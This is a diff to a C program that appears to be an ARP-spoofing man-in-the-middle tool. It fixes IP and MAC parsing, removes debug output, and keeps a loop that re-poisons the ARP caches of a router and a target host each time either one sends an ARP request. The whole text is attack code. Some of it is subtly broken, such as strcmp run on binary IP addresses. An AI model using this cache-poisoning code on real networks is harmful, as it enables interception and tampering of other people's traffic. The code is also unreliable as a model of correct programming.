@@ -71,11 +71,11 @@ int main(int argc, char *argv[])
   arp_request(ifname, my_ip, my_mac, router_ip, router_mac);   
   arp_spoof(ifname, my_ip, my_mac, targetIP, router_ip, router_mac); 
 
-  inet_pton(AF_INET, router_ip , router_ip_hex);
-  inet_pton(AF_INET, targetIP  , targetIP_hex);
-  inet_pton(AF_INET, my_ip  , my_mac_hex);
+  inet_pton(AF_INET, my_ip  , my_ip_hex);  
+  inet_pton(AF_INET, router_ip , router_ip_hex);  
+  inet_pton(AF_INET, targetIP  , targetIP_hex);  
 
-   sscanf(my_mac, "%x:%x:%x:%x:%x:%x",  
+   sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  
         (u_int8_t *)&my_mac_hex[0],
         (u_int8_t *)&my_mac_hex[1],
         (u_int8_t *)&my_mac_hex[2],
@@ -84,7 +84,7 @@ int main(int argc, char *argv[])
         (u_int8_t *)&my_mac_hex[5]); 
  
 
-     sscanf(targetMAC, "%x:%x:%x:%x:%x:%x",  
+     sscanf(targetMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  
         (u_int8_t *)&targetMAC_hex[0],
         (u_int8_t *)&targetMAC_hex[1],
         (u_int8_t *)&targetMAC_hex[2],
@@ -130,31 +130,17 @@ int main(int argc, char *argv[])
     if (ntohs(eth->ether_type) == ETHERTYPE_ARP)
     {
       arp = (struct ether_arp*)(pkt_data + sizeof(struct ether_header));
-      printf("ARP PACKET \n");
-
+      
       if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST)
       {
-        printf("ARP REQUEST PACKET \n");
-
-          printf(" |arp target ip Address : %s \n",
-          inet_ntoa(arp->arp_tpa) );
-        
-        printf(" |router Address : %s \n",
-          inet_nota(router_ip_hex));
- 
         if(strcmp(arp->arp_tpa, router_ip_hex) == 0)
-        {
-          printf("ROUTER ARP REQUEST PACKET \n");
-          sleep(1);
-
-          arp_request(ifname, my_ip, my_mac, targetIP, targetMAC);   
+        {          
+          sleep(1);         
           arp_spoof(ifname, my_ip, my_mac, router_ip, targetIP, targetMAC); 
         }
         else if(strcmp(arp->arp_tpa, targetIP_hex) == 0)
-        {
-          printf("Target ARP REQUEST PACKET \n");
-          sleep(1);
-          arp_request(ifname, my_ip, my_mac, router_ip, router_mac);   
+        {          
+          sleep(1);          
           arp_spoof(ifname, my_ip, my_mac, targetIP, router_ip, router_mac); 
         }
         else
